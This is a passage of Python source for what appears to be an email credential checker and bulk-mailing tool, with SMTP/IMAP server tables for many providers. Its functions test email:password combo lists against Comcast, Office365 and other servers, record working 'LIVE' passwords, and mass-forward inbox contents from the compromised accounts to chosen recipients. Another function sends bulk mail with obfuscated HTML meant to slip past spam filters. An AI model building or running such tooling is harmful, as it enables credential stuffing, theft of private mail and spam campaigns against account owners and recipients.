    "gmail.com": {"servers": [("smtp.gmail.com", 587, "TLS"), ("smtp.gmail.com", 465, "SSL")], "type": "Gmail", "limit": 500},
    "yahoo.com": {"servers": [("smtp.mail.yahoo.com", 465, "SSL")], "type": "Yahoo", "limit": 700},
    "onet.pl": {"servers": [("smtp.poczta.onet.pl", 587, "TLS")], "type": "Onet", "limit": 1000},
    "t-online.de": {"servers": [("securesmtp.t-online.de", 587, "TLS")], "type": "T-Online", "limit": 1000},
    "netzero.net": {"servers": [("smtp.netzero.net", 587, "TLS")], "type": "Netzero", "limit": 500},
    "rediffmail.com": {"servers": [("smtp.rediffmail.com", 587, "TLS")], "type": "Rediff", "limit": 500},
    "centrum.cz": {"servers": [("smtp.centrum.cz", 587, "TLS")], "type": "Centrum", "limit": 500},
    "eircom.net": {"servers": [("mail.eircom.net", 587, "TLS")], "type": "Eircom", "limit": 500},
    "amazonaws.com": {"servers": [("email-smtp.us-east-1.amazonaws.com", 587, "TLS")], "type": "AWS", "limit": 10000},
    "sendgrid.net": {"servers": [("smtp.sendgrid.net", 587, "TLS")], "type": "SendGrid", "limit": 1000},
    "mailgun.org": {"servers": [("smtp.mailgun.org", 587, "TLS")], "type": "Mailgun", "limit": 1000},
    "zoho.com": {"servers": [("smtp.zoho.com", 587, "TLS")], "type": "Zoho", "limit": 500},
    "aol.com": {"servers": [("smtp.aol.com", 587, "TLS")], "type": "AOL", "limit": 500},
    "web.de": {"servers": [("smtp.web.de", 587, "TLS")], "type": "Web.de", "limit": 500},
    "arcor.de": {"servers": [("mail.arcor.de", 587, "TLS")], "type": "Arcor", "limit": 500},
    "free.fr": {"servers": [("smtp.free.fr", 465, "SSL")], "type": "Free.fr", "limit": 300},
    "orange.fr": {"servers": [("smtp.orange.fr", 465, "SSL")], "type": "Orange", "limit": 300},
    "sfr.fr": {"servers": [("smtp.sfr.fr", 465, "SSL")], "type": "SFR", "limit": 300},
    "gmx.at": {"servers": [("smtp.gmx.at", 587, "TLS")], "type": "GMX", "limit": 300},
    "mail.ru": {"servers": [("smtp.mail.ru", 465, "SSL")], "type": "Mail.ru", "limit": 300},
    "proton.me": {"servers": [("smtp.protonmail.com", 587, "TLS")], "type": "Proton", "limit": 300},
    "protonmail.com": {"servers": [("smtp.protonmail.com", 587, "TLS")], "type": "Proton", "limit": 300},
    # --- BRAZIL PRESET ---
    "uol.com.br": {"servers": [("smtps.uol.com.br", 587, "TLS"), ("smtps.uol.com.br", 465, "SSL")], "type": "UOL", "limit": 500},
    "bol.com.br": {"servers": [("smtps.bol.com.br", 587, "TLS"), ("smtps.bol.com.br", 465, "SSL")], "type": "BOL", "limit": 500},
    "ig.com.br": {"servers": [("smtp.ig.com.br", 587, "TLS"), ("smtp.ig.com.br", 465, "SSL")], "type": "IG", "limit": 500},
    "terra.com.br": {"servers": [("smtp.terra.com.br", 587, "TLS")], "type": "Terra", "limit": 500},
    # --- TURKEY PRESET ---
    "mynet.com": {"servers": [("smtp.mynet.com", 465, "SSL")], "type": "Mynet", "limit": 500},
    "windowslive.com": {"servers": [("smtp.office365.com", 587, "TLS")], "type": "Microsoft", "limit": 500},
    # --- ITALY PRESET ---
    "alice.it": {"servers": [("out.alice.it", 587, "TLS")], "type": "Alice", "limit": 500},
    "tin.it": {"servers": [("mail.tin.it", 587, "TLS")], "type": "Tin", "limit": 500},
    # --- SPAIN PRESET ---
    "movistar.es": {"servers": [("smtp.movistar.es", 25, "PLAIN")], "type": "Movistar", "limit": 300},
    "telefonica.net": {"servers": [("smtp.telefonica.net", 25, "PLAIN")], "type": "Telefonica", "limit": 300},
    # --- USA PRESET ---
    "comcast.net": {"servers": [("smtp.comcast.net", 587, "TLS"), ("smtp.comcast.net", 465, "SSL"), ("outgoing.comcast.net", 587, "TLS")], "type": "Comcast", "limit": 1000},
    "comcast.com": {"servers": [("smtp.comcast.net", 587, "TLS"), ("smtp.comcast.net", 465, "SSL"), ("outgoing.comcast.net", 587, "TLS")], "type": "Comcast", "limit": 1000},
    "att.net": {"servers": [("smtp.mail.att.net", 465, "SSL")], "type": "AT&T", "limit": 500},
    "charter.net": {"servers": [("mobile.charter.net", 587, "TLS")], "type": "Spectrum", "limit": 500},
    "spectrum.net": {"servers": [("mobile.charter.net", 587, "TLS")], "type": "Spectrum", "limit": 500},
    "optonline.net": {"servers": [("mail.optonline.net", 465, "SSL")], "type": "Optimum", "limit": 500},
    "cox.net": {"servers": [("smtp.cox.net", 587, "TLS")], "type": "Cox", "limit": 500},
    "centurylink.net": {"servers": [("smtp.centurylink.net", 587, "TLS")], "type": "CenturyLink", "limit": 500},
    # --- GERMANY PRESET ---
    "gmx.de": {"servers": [("mail.gmx.net", 587, "TLS"), ("mail.gmx.net", 465, "SSL")], "type": "GMX", "limit": 1000},
    "gmx.net": {"servers": [("mail.gmx.net", 587, "TLS"), ("mail.gmx.net", 465, "SSL")], "type": "GMX", "limit": 1000},
    "freenet.de": {"servers": [("mx.freenet.de", 587, "TLS")], "type": "Freenet", "limit": 500},
    "web.de": {"servers": [("smtp.web.de", 587, "TLS")], "type": "Web.de", "limit": 500},
    "arcor.de": {"servers": [("mail.arcor.de", 587, "TLS")], "type": "Arcor", "limit": 500},
    "t-online.de": {"servers": [("securesmtp.t-online.de", 587, "TLS")], "type": "T-Online", "limit": 1000},
    "posteo.de": {"servers": [("posteo.de", 587, "TLS")], "type": "Posteo", "limit": 500},
    "mailbox.org": {"servers": [("smtp.mailbox.org", 465, "SSL")], "type": "Mailbox.org", "limit": 500},
    "unitybox.de": {"servers": [("smtp.unitybox.de", 587, "TLS")], "type": "Unitybox", "limit": 500},
    "vodafone.de": {"servers": [("smtp.vodafone.de", 587, "TLS")], "type": "Vodafone", "limit": 500},
    "netcologne.de": {"servers": [("smtp.netcologne.de", 587, "TLS")], "type": "NetCologne", "limit": 500},
    "mnet-online.de": {"servers": [("mail.mnet-online.de", 587, "TLS")], "type": "M-Net", "limit": 500},
    # --- ISRAEL PRESET ---
    "walla.co.il": {"servers": [("out.walla.co.il", 587, "TLS")], "type": "Walla", "limit": 500},
    "walla.com": {"servers": [("out.walla.co.il", 587, "TLS")], "type": "Walla", "limit": 500},
    # --- EUROPE PRESET ---
    "libero.it": {"servers": [("smtp.libero.it", 465, "SSL")], "type": "Libero", "limit": 500},
    "virgilio.it": {"servers": [("smtp.virgilio.it", 465, "SSL")], "type": "Virgilio", "limit": 500},
    "btinternet.com": {"servers": [("mail.btinternet.com", 465, "SSL")], "type": "BT", "limit": 500},
    "sky.com": {"servers": [("smtp.tools.sky.com", 465, "SSL")], "type": "Sky", "limit": 500},
    "talktalk.net": {"servers": [("smtp.talktalk.net", 587, "TLS")], "type": "TalkTalk", "limit": 500},
    "tiscali.it": {"servers": [("smtp.tiscali.it", 465, "SSL")], "type": "Tiscali", "limit": 500},
    "o2.pl": {"servers": [("poczta.o2.pl", 465, "SSL")], "type": "O2.pl", "limit": 1000},
    "seznam.cz": {"servers": [("smtp.seznam.cz", 465, "SSL")], "type": "Seznam", "limit": 1000},
    "email.cz": {"servers": [("smtp.seznam.cz", 465, "SSL")], "type": "Seznam", "limit": 1000},
    "post.cz": {"servers": [("smtp.seznam.cz", 465, "SSL")], "type": "Seznam", "limit": 1000},
    "telenet.be": {"servers": [("smtp.telenet.be", 587, "TLS")], "type": "Telenet", "limit": 500},
    "bluewin.ch": {"servers": [("smtpauths.bluewin.ch", 465, "SSL")], "type": "Bluewin", "limit": 500},
    "online.no": {"servers": [("smtp.online.no", 587, "TLS")], "type": "Online.no", "limit": 500},
    "earthlink.net": {"servers": [("smtpauth.earthlink.net", 587, "TLS")], "type": "Earthlink", "limit": 500},
    # --- MIDDLE EAST PRESET ---
    "bezeqint.net": {"servers": [("out.bezeqint.net", 587, "SSL")], "type": "Bezeq", "limit": 500},
    "etisalat.ae": {"servers": [("exmail.emirates.net.ae", 587, "TLS")], "type": "Etisalat", "limit": 1000},
    "emirates.net.ae": {"servers": [("exmail.emirates.net.ae", 587, "TLS")], "type": "Etisalat", "limit": 1000},
    # --- CANADA PRESET ---
    "bell.net": {"servers": [("smtphm.sympatico.ca", 587, "TLS")], "type": "Bell", "limit": 500},
    "sympatico.ca": {"servers": [("smtphm.sympatico.ca", 587, "TLS")], "type": "Bell", "limit": 500},
    "cogeco.ca": {"servers": [("smtp.cogeco.ca", 465, "SSL")], "type": "Cogeco", "limit": 500},
    "videotron.ca": {"servers": [("smtp.videotron.ca", 465, "SSL")], "type": "Videotron", "limit": 500},
    "shaw.ca": {"servers": [("mail.shaw.ca", 587, "TLS")], "type": "Shaw", "limit": 500},
    "telus.net": {"servers": [("smtp.telus.net", 465, "SSL")], "type": "Telus", "limit": 500},
    "rogers.com": {"servers": [("smtp.mail.yahoo.com", 465, "SSL")], "type": "Yahoo", "limit": 500},
    "upei.ca": {"servers": [("smtp.office365.com", 587, "TLS"), ("smtp.office365.com", 465, "SSL")], "type": "Microsoft", "limit": 500},
    "uwaterloo.ca": {"servers": [("smtp.office365.com", 587, "TLS")], "type": "Microsoft", "limit": 500},
    "utoronto.ca": {"servers": [("smtp.office365.com", 587, "TLS")], "type": "Microsoft", "limit": 500},
    "ubc.ca": {"servers": [("smtp.office365.com", 587, "TLS")], "type": "Microsoft", "limit": 500},
    "mcgill.ca": {"servers": [("smtp.office365.com", 587, "TLS")], "type": "Microsoft", "limit": 500},
    "ualberta.ca": {"servers": [("smtp.gmail.com", 587, "TLS")], "type": "Gmail", "limit": 500},
    "canada.ca": {"servers": [("smtp.office365.com", 587, "TLS")], "type": "Microsoft", "limit": 1000},
    "mail.ca": {"servers": [("smtp.mail.ca", 587, "TLS")], "type": "Mail.ca", "limit": 500},
    "teksavvy.com": {"servers": [("smtp.teksavvy.com", 587, "TLS")], "type": "TekSavvy", "limit": 500},
    "eastlink.ca": {"servers": [("smtp.eastlink.ca", 587, "TLS")], "type": "Eastlink", "limit": 500},
    "sasktel.net": {"servers": [("smtp.sasktel.net", 587, "TLS")], "type": "SaskTel", "limit": 500}
}

def get_email_config(email: str):
    dom = email.split('@')[-1].lower()
    if '.edu' in dom or '.gov' in dom: return SMTP_CONFIGS["office365.com"]
    if 'yahoo.' in dom: return SMTP_CONFIGS["yahoo.com"]
    if 'live.' in dom: return SMTP_CONFIGS["live.com"]
    if 'hotmail.' in dom: return SMTP_CONFIGS["hotmail.com"]
    if 'outlook.' in dom: return SMTP_CONFIGS["outlook.com"]
    if 'wanadoo.fr' in dom: return SMTP_CONFIGS["orange.fr"]
    if 'gmx.' in dom: return SMTP_CONFIGS["gmx.at"]
    
    cfg = SMTP_CONFIGS.get(dom)
    if cfg: return cfg
    
    # Broad matches for Canada and Germany as requested
    if dom.endswith('.ca'):
        return {"servers": [("smtp." + dom, 587, "TLS"), ("mail." + dom, 587, "TLS"), ("smtp.office365.com", 587, "TLS")], "type": "Generic-CA", "limit": 500}
    if dom.endswith('.de'):
        return {"servers": [("smtp." + dom, 587, "TLS"), ("mail." + dom, 587, "TLS")], "type": "Generic-DE", "limit": 500}
        
    return None


def get_mx_imap(domain: str):
    try:
        ans = resolver.resolve(domain, 'MX')
        mx = sorted(ans, key=lambda r: r.preference)[0].exchange.to_text().lower().rstrip('.')

        # Google
        if "google" in mx or "gmail" in mx: return "imap.gmail.com", 993, "pop.gmail.com", 995
        # Microsoft / Office365
        if "outlook" in mx or "protection.outlook" in mx or "pphosted" in mx or "microsoft" in mx: return "outlook.office365.com", 993, "outlook.office365.com", 995
        # Yahoo (also powers Rogers, AT&T, BellSouth, etc.)
        if "yahoo" in mx or "yahoodns" in mx: return "imap.mail.yahoo.com", 993, "pop.mail.yahoo.com", 995
        # GoDaddy
        if "secureserver" in mx: return "imap.secureserver.net", 993, "pop.secureserver.net", 995
        # Comcast / Xfinity
        if "comcast" in mx: return "imap.comcast.net", 993, "pop.comcast.net", 995
        # AT&T
        if "att.net" in mx or "prodigy" in mx or "sbcglobal" in mx: return "imap.mail.att.net", 993, "pop.mail.att.net", 995
        # Cox
        if "cox.net" in mx: return "imap.cox.net", 993, "pop.cox.net", 995
        # Charter / Spectrum
        if "charter" in mx or "spectrum" in mx: return "mobile.charter.net", 993, "mobile.charter.net", 995
        # CenturyLink / Lumen
        if "centurylink" in mx or "lumen" in mx: return "imap.centurylink.net", 993, "pop.centurylink.net", 995
        # Optimum / Cablevision
        if "optonline" in mx or "cablevision" in mx: return "mail.optonline.net", 993, "mail.optonline.net", 995
        # Earthlink
        if "earthlink" in mx: return "imap.earthlink.net", 993, "pop.earthlink.net", 995
        # AOL
        if "aol" in mx: return "imap.aol.com", 993, "pop.aol.com", 995
        # Mail.ru
        if "mail.ru" in mx or "mxs.mail.ru" in mx: return "imap.mail.ru", 993, "pop.mail.ru", 995
        # Yandex
        if "yandex" in mx: return "imap.yandex.ru", 993, "pop.yandex.ru", 995
        # Zoho
        if "zoho" in mx: return "imap.zoho.com", 993, "pop.zoho.com", 995
        # ProtonMail
        if "proton" in mx or "protonmail" in mx: return "imap.protonmail.com", 993, "pop.protonmail.com", 995
        # GMX
        if "gmx" in mx: return "imap.gmx.net", 993, "pop.gmx.net", 995
        # Web.de
        if "web.de" in mx: return "imap.web.de", 993, "pop.web.de", 995
        # T-Online
        if "t-online" in mx: return "secureimap.t-online.de", 993, "securepop.t-online.de", 995
        # Freenet
        if "freenet" in mx: return "mx.freenet.de", 993, "mx.freenet.de", 995
        # Libero
        if "libero" in mx: return "imapmail.libero.it", 993, "popmail.libero.it", 995
        # BT Internet
        if "btinternet" in mx or ".bt.com" in mx: return "mail.btinternet.com", 993, "mail.btinternet.com", 995
        # Bell Canada / Sympatico
        if "sympatico" in mx or "bell.net" in mx or "bell.ca" in mx: return "imaphm.sympatico.ca", 993, "pophm.sympatico.ca", 995
        # Seznam.cz
        if "seznam" in mx: return "imap.seznam.cz", 993, "pop.seznam.cz", 995
        # Onet.pl
        if "onet.pl" in mx: return "imap.poczta.onet.pl", 993, "pop.poczta.onet.pl", 995
        # OVH
        if "ovh" in mx: return "imap." + domain, 993, "pop." + domain, 995
        # Rackspace / Emailsrvr
        if "emailsrvr" in mx or "rackspace" in mx: return "secure.emailsrvr.com", 993, "secure.emailsrvr.com", 995
        # Mimecast
        if "mimecast" in mx: return "outlook.office365.com", 993, "outlook.office365.com", 995
        # Barracuda
        if "barracuda" in mx: return "outlook.office365.com", 993, "outlook.office365.com", 995

        # Last resort: if MX host itself contains the domain, try imap.<domain>
        if domain in mx:
            return f"imap.{domain}", 993, f"pop.{domain}", 995
    except: pass
    return None

def discover_server(domain: str):
    d = domain.lower()
    if any(m in d for m in MICROSOFT): return "outlook.office365.com", 993, "outlook.office365.com", 995, "smtp.office365.com", 587
    if any(g in d for g in GMAIL): return "imap.gmail.com", 993, "pop.gmail.com", 995, "smtp.gmail.com", 465
    if 'yahoo' in d: return "imap.mail.yahoo.com", 993, "pop.mail.yahoo.com", 995, "smtp.mail.yahoo.com", 465
    
    # --- Check KNOWN_IMAP_SERVERS + SMTP_CONFIGS for hardcoded ISP/provider entries ---
    known_imap = KNOWN_IMAP_SERVERS.get(d)
    if known_imap:
        ih, ip = known_imap[0]  # Use first (preferred) IMAP server
        # Look up SMTP from SMTP_CONFIGS if available
        smtp_cfg = SMTP_CONFIGS.get(d)
        if smtp_cfg and smtp_cfg.get("servers"):
            sh, sp, _ = smtp_cfg["servers"][0]
        else:
            sh, sp = f"smtp.{d}", 587
        return ih, ip, f"pop.{d}", 995, sh, sp
    
    # Check DB for user-saved provider
    p = get_provider(d)
    if p: return (str(p[0]), int(p[1]), str(p[2]), int(p[3]), str(p[4]), int(p[5]))
    
    # Check if SMTP_CONFIGS has this domain (even without IMAP entry) — infer IMAP
    smtp_cfg = SMTP_CONFIGS.get(d)
    if smtp_cfg and smtp_cfg.get("servers"):
        sh, sp, _ = smtp_cfg["servers"][0]
        return f"imap.{d}", 993, f"pop.{d}", 995, sh, sp
    
    # MX record lookup
    mx = get_mx_imap(d)
    if mx:
        # Also try to find SMTP from SMTP_CONFIGS
        smtp_cfg = SMTP_CONFIGS.get(d)
        if smtp_cfg and smtp_cfg.get("servers"):
            sh, sp, _ = smtp_cfg["servers"][0]
        else:
            sh, sp = f"smtp.{d}", 587
        return mx[0], mx[1], mx[2], mx[3], sh, sp
    
    # Active Probe Fallback for Custom Domains
    prefixes = ['imap', 'mail', 'ssl0', 'outlook', 'mx', 'webmail', 'secure', 'inbound', 'imap-mail', 'host']
    for pref in prefixes:
        for port in [993, 143]:
            try:
                srv = f"{pref}.{d}"
                with socket.create_connection((srv, port), timeout=2):
                    return srv, port, f"pop.{d}", 995, f"smtp.{d}", 587
            except: continue
    
    # Try common provider subdomains directly
    if 'business' in d or 'corp' in d:
        if check_port('imap.secureserver.net', 993): return 'imap.secureserver.net', 993, 'pop.secureserver.net', 995, 'smtpout.secureserver.net', 465

    # Direct domain probe
    for port in [993, 143]:
        try:
            with socket.create_connection((d, port), timeout=2):
                return d, port, d, 995, d, 587
        except: continue
        
    return f"imap.{d}", 993, f"pop.{d}", 995, f"smtp.{d}", 587

def discover_smtp(domain: str):
    d = domain.lower()
    if d in state.smtp_cache: return state.smtp_cache[d]

    def _do_disc():
        cfg = SMTP_CONFIGS.get(d)
        if isinstance(cfg, dict):
            servers = cfg.get("servers", [])
            if servers: return str(servers[0][0]), int(servers[0][1])
        
        if any(m in d for m in MICROSOFT): return "smtp.office365.com", 587
        if any(g in d for g in GMAIL): return "smtp.gmail.com", 587
        if 'yahoo' in d: return "smtp.mail.yahoo.com", 587
        
        # MX record discovery
        try:
            ans = resolver.resolve(d, 'MX')
            mx = sorted(ans, key=lambda r: r.preference)[0].exchange.to_text().lower().rstrip('.')
            for port in [587, 465, 25]:
                try:
                    with socket.create_connection((mx, port), timeout=2): return mx, port
                except: continue
        except: pass

        # Probe common SMTP subdomains
        prefixes = ['smtp', 'mail', 'ssl0', 'outbound', 'smtp-mail', 'pro']
        for pref in prefixes:
            for port in [587, 465, 25]:
                try:
                    srv = f"{pref}.{d}"
                    with socket.create_connection((srv, port), timeout=2): return srv, port
                except: continue
                
        # Try direct domain
        for port in [587, 465, 25]:
            try:
                with socket.create_connection((d, port), timeout=2): return d, port
            except: continue
            
        return f"smtp.{d}", 587

    res = _do_disc()
    state.smtp_cache[d] = res
    return res

# ============================================
# NEW ENHANCED FUNCTIONS - COMCAST, OFFICE365, FORWARDING
# ============================================

async def check_comcast_smtp(email: str, password: str, timeout: int = 10) -> Dict[str, Any]:
    """Enhanced Comcast SMTP checker with multiple server fallbacks"""
    servers = [
        ("smtp.comcast.net", 587, "TLS"),
        ("smtp.comcast.net", 465, "SSL"),
        ("outgoing.comcast.net", 587, "TLS"),
    ]
    
    for server, port, encryption in servers:
        try:
            if encryption == "SSL" or port == 465:
                smtp = smtplib.SMTP_SSL(server, port, context=ctx, timeout=timeout)
                smtp.ehlo(server)
            else:
                smtp = smtplib.SMTP(server, port, timeout=timeout)
                smtp.ehlo(server)
                try:
                    smtp.starttls(context=ctx)
                    smtp.ehlo(server)
                except smtplib.SMTPNotSupportedError:
                    pass
            
            smtp.login(email, password)
            smtp.quit()
            return {
                "status": "LIVE",
                "email": email,
                "password": password,
                "server": server,
                "port": port,
                "encryption": encryption,
                "type": "Comcast",
                "timestamp": datetime.datetime.now().isoformat()
            }
        except Exception as e:
            continue
    
    return {"status": "DEAD", "email": email, "error": str(e)}

def safe_execute_with_retry(func, *args, **kwargs):
    """Executes a function with exponential backoff retry logic"""
    max_retries = state.max_retries
    delay = state.retry_delay
    
    last_exception = None
    for attempt in range(max_retries + 1):
        try:
            return func(*args, **kwargs)
        except (imaplib.IMAP4.error, poplib.error_proto, smtplib.SMTPException, socket.timeout, socket.error, ssl.SSLError) as e:
            last_exception = e
            if attempt < max_retries:
                # Exponential backoff: delay * (2 ^ attempt)
                sleep_time = delay * (2 ** attempt)
                time.sleep(sleep_time)
            else:
                raise e
        except Exception as e:
            # For non-network errors, don't retry unless specified
            raise e
    return None

def verify_imap_access(email: str, password: str) -> Dict[str, Any]:
    domain = email.split('@')[-1].lower()
    ih, ip, _, _, _, _ = discover_server(domain)
    
    def _do_check():
        if int(ip) == 993:
            with imaplib.IMAP4_SSL(ih, int(ip), timeout=state.timeout, ssl_context=ctx) as m:
                m.login(email, password)
                m.select('INBOX', readonly=True)
                m.logout()
        else:
            with imaplib.IMAP4(ih, int(ip), timeout=state.timeout) as m:
                try:
                    m.starttls(ssl_context=ctx)
                except:
                    pass
                m.login(email, password)
                m.select('INBOX', readonly=True)
                m.logout()
        return {"ok": True, "server": ih, "port": int(ip)}

    try:
        return safe_execute_with_retry(_do_check)
    except imaplib.IMAP4.error as ex:
        err_msg = str(ex)
        if "authentication failed" in err_msg.lower() or "login failed" in err_msg.lower():
            return {"ok": False, "server": ih, "port": int(ip), "error": "Invalid Credentials"}
        return {"ok": False, "server": ih, "port": int(ip), "error": f"IMAP Auth Error: {err_msg}"}
    except socket.timeout:
        return {"ok": False, "server": ih, "port": int(ip), "error": "Connection Timeout"}
    except socket.error as ex:
        return {"ok": False, "server": ih, "port": int(ip), "error": f"Network Error: {str(ex)}"}
    except Exception as ex:
        return {"ok": False, "server": ih, "port": int(ip), "error": str(ex)}

async def check_office365_smtp(email: str, password: str, timeout: int = 10) -> Dict[str, Any]:
    """Enhanced Office365 SMTP checker with primary & fallback servers"""
    servers = [
        ("smtp.office365.com", 587, "TLS"),
        ("smtp.office365.com", 465, "SSL"),
        ("smtp-mail.outlook.com", 587, "TLS"),
    ]
    
    for server, port, encryption in servers:
        try:
            if encryption == "SSL" or port == 465:
                smtp = smtplib.SMTP_SSL(server, port, context=ctx, timeout=timeout)
                smtp.ehlo(server)
            else:
                smtp = smtplib.SMTP(server, port, timeout=timeout)
                smtp.ehlo(server)
                try:
                    smtp.starttls(context=ctx)
                    smtp.ehlo(server)
                except smtplib.SMTPNotSupportedError:
                    pass
            
            smtp.login(email, password)
            smtp.quit()
            return {
                "status": "LIVE",
                "email": email,
                "password": password,
                "server": server,
                "port": port,
                "encryption": encryption,
                "type": "Office365",
                "timestamp": datetime.datetime.now().isoformat()
            }
        except Exception as e:
            continue
    
    return {"status": "DEAD", "email": email, "error": str(e)}

async def forward_emails_inbox_to_inbox(
    source_email: str,
    source_password: str,
    target_emails: List[str],
    limit: int = 50,
    mark_as_read: bool = False
) -> Dict[str, Any]:
    """
    Forward emails from source inbox to target email list (Inbox to Inbox)
    Supports Gmail, Outlook, and generic IMAP servers
    """
    results = {
        "forwarded": 0,
        "failed": 0,
        "errors": [],
        "target_emails": target_emails,
        "targets_reached": []
    }
    
    try:
        domain = source_email.split('@')[1].lower()
        imap_host, imap_port, _, _, smtp_host, smtp_port = discover_server(domain)
        
        # Connect to IMAP
        if imap_port == 993:
            imap = imaplib.IMAP4_SSL(imap_host, imap_port, timeout=15)
        else:
            imap = imaplib.IMAP4(imap_host, imap_port, timeout=15)
        
        imap.login(source_email, source_password)
        imap.select('INBOX')
        
        # Get emails
        status, messages = imap.search(None, 'ALL')
        email_ids = messages[0].split()[-limit:] if messages[0] else []
        
        # Connect to SMTP for forwarding
        smtp = smtplib.SMTP(smtp_host, smtp_port, timeout=15)
        smtp.starttls()
        smtp.login(source_email, source_password)
        
        for msg_id in email_ids:
            try:
                status, msg_data = imap.fetch(msg_id, '(RFC822)')
                email_body = msg_data[0][1]
                email_message = message_from_bytes(email_body)
                
                # Create forward message
                forward_msg = MIMEMultipart()
                forward_msg['From'] = source_email
                forward_msg['Subject'] = format_header_subject(f"FWD: {email_message.get('Subject', 'No Subject')}")
                forward_msg['Date'] = formatdate(localtime=True)
                
                body_text = f"""
---------- Forwarded message ----------
From: {email_message.get('From', 'Unknown')}
Date: {email_message.get('Date', 'Unknown')}
Subject: {email_message.get('Subject', 'No Subject')}
To: {email_message.get('To', 'Unknown')}

{email_message.get_payload(decode=True).decode('utf-8', errors='ignore') if email_message.get_payload() else 'No content'}
"""
                
                forward_msg.attach(MIMEText(body_text, 'plain'))
                
                # Send to all target emails
                for target in target_emails:
                    try:
                        smtp.send_message(forward_msg, from_addr=source_email, to_addrs=target)
                        results["forwarded"] += 1
                        if target not in results["targets_reached"]:
                            results["targets_reached"].append(target)
                    except Exception as e:
                        results["failed"] += 1
                        results["errors"].append(f"Failed to send to {target}: {str(e)}")
                
                # Mark as read if requested
                if mark_as_read:
                    imap.store(msg_id, '+FLAGS', '\\Seen')
                    
            except Exception as e:
                results["failed"] += 1
                results["errors"].append(f"Error processing message {msg_id}: {str(e)}")
        
        imap.close()
        imap.logout()
        smtp.quit()
        
        results["success"] = True
        results["timestamp"] = datetime.datetime.now().isoformat()
        
    except Exception as e:
        results["success"] = False
        results["error"] = str(e)
    
    return results

async def mass_forward_to_inbox(
    valid_emails_list: List[str],
    target_recipients: List[str],
    max_emails_per_account: int = 20,
    delay_between_accounts: float = 2.0
) -> Dict[str, Any]:
    """
    Mass forward emails from multiple valid accounts to target recipients
    Powerful tool for inbox-to-inbox operations
    """
    summary = {
        "total_accounts": len(valid_emails_list),
        "total_targets": len(target_recipients),
        "accounts_processed": 0,
        "total_forwarded": 0,
        "total_failed": 0,
        "per_account_results": []
    }
    
    for account_data in valid_emails_list:
        try:
            # Parse account data (email:password format)
            if isinstance(account_data, str):
                parts = account_data.split(':')
                if len(parts) < 2:
                    continue
                email, password = parts[0], parts[1]
            else:
                email = account_data.get('email')
                password = account_data.get('password')
            
            result = await forward_emails_inbox_to_inbox(
                email, password, target_recipients, 
                limit=max_emails_per_account
            )
            
            summary["per_account_results"].append({
                "email": email,
                "forwarded": result.get("forwarded", 0),
                "failed": result.get("failed", 0),
                "success": result.get("success", False)
            })
            
            summary["accounts_processed"] += 1
            summary["total_forwarded"] += result.get("forwarded", 0)
            summary["total_failed"] += result.get("failed", 0)
            
            await asyncio.sleep(delay_between_accounts)
            
        except Exception as e:
            continue
    
    summary["timestamp"] = datetime.datetime.now().isoformat()
    return summary

async def powerful_smtp_sender(
    from_email: str,
    from_password: str,
    to_emails: List[str],
    subject: str,
    body: str,
    html_body: str = None,
    attachments: List[str] = None,
    signature: str = None,
    encrypt_body: bool = False,
    retry_count: int = 3
) -> Dict[str, Any]:
    """Powerful SMTP sender with async retry logic, attachments, and HTML support."""
    result = {
        "from": from_email,
        "to": to_emails,
        "sent": 0,
        "failed": 0,
        "failed_recipients": [],
        "retries_used": 0
    }
    
    domain = from_email.split('@')[1].lower()
    cfg = SMTP_CONFIGS.get(domain, {})
    servers = cfg.get("servers", [("smtp.gmail.com", 587, "TLS")])
    
    message = MIMEMultipart('alternative')
    message['From'] = from_email
    message['Subject'] = format_header_subject(subject)
    message['Date'] = formatdate(localtime=True)
    message['Message-ID'] = make_msgid()
    
    if encrypt_body and html_body:
        # Anti-spam: safely inject HTML comments only into text nodes so the HTML
        # structure stays valid and ALL email clients render it normally.
        obf_html = obfuscate_html(html_body)
        obf_html += f'<!--MSG:{randstr(18)}-->'
        plain_part = MIMEText(html_to_plain(body), 'plain', 'utf-8')
        html_part  = MIMEText(obf_html, 'html', 'utf-8')
        message.attach(plain_part)
        message.attach(html_part)
    elif encrypt_body and not html_body:
        # Plain-text body: wrap in HTML and obfuscate safely
        html_wrap = f'<html><body><div>{body}</div></body></html>'
        obf_html  = obfuscate_html(html_wrap)
        message.attach(MIMEText(body, 'plain', 'utf-8'))
        message.attach(MIMEText(obf_html, 'html', 'utf-8'))
    else:
        if html_body:
            message.attach(MIMEText(body, 'plain', 'utf-8'))
            message.attach(MIMEText(html_body, 'html', 'utf-8'))
        else:
            if signature:
                body += f"\n\n{signature}"
            message.attach(MIMEText(body, 'plain'))

    
    if attachments:
        for file_path in attachments:
            if os.path.exists(file_path):
                with open(file_path, 'rb') as f:
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(f.read())
                    encoders.encode_base64(part)
                    part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(file_path)}')
                    message.attach(part)
    
    loop = asyncio.get_event_loop()
    
    for attempt in range(retry_count):
        for server, port, encryption in servers:
            try:
                def send_smtp(server=server, port=port, encryption=encryption):
                    if encryption == "SSL" or port == 465:
                        s = smtplib.SMTP_SSL(server, port, context=ctx, timeout=15)
                        s.ehlo(server)
                    else:
                        s = smtplib.SMTP(server, port, timeout=15)
                        s.ehlo(server)
                        try:
                            s.starttls(context=ctx)
                            s.ehlo(server)
                        except smtplib.SMTPNotSupportedError:
                            pass  # STARTTLS not supported, continue plain
                    s.login(from_email, from_password)
                    for recipient in to_emails:
                        try:
                            s.send_message(message, from_addr=from_email, to_addrs=recipient)
                            result["sent"] += 1
                        except Exception:
                            result["failed"] += 1
                            result["failed_recipients"].append(recipient)
                    s.quit()
                
                await loop.run_in_executor(None, send_smtp)
                result["retries_used"] = attempt
                result["success"] = True
                result["timestamp"] = datetime.datetime.now().isoformat()
                return result
            except Exception as e:
                if attempt == retry_count - 1:
                    result["error"] = str(e)
                continue
    
    result["success"] = False
    return result

class GlobalState:
    def __init__(self):
        self.checked = 0; self.valid = 0; self.bad = 0; self.hits = 0
        self.is_running = False; self.stop_requested = False
        self.combos: List[str] = []; self.proxies: List[str] = []; self.parsed_proxies: List[Dict] = []; self.threads: int = 100
        self.start_time: float = 0.0; self.lock = threading.Lock(); self.live_hits: List[Dict[str, str]] = []
        self.search_count: int = 0; self.search_hits: int = 0; self.search_fail: int = 0
        self.search_running: bool = False; self.search_results: List[Any] = []
        self.disc_total = 0; self.disc_done = 0; self.disc_found = 0; self.disc_running = False
        self.session_dir = ""
        # SMTP Checker Stats
        self.smtp_checked = 0; self.smtp_live = 0; self.smtp_bad = 0
        self.smtp_running = False; self.smtp_combos: List[str] = []
        self.smtp_results: List[Dict[str, str]] = []
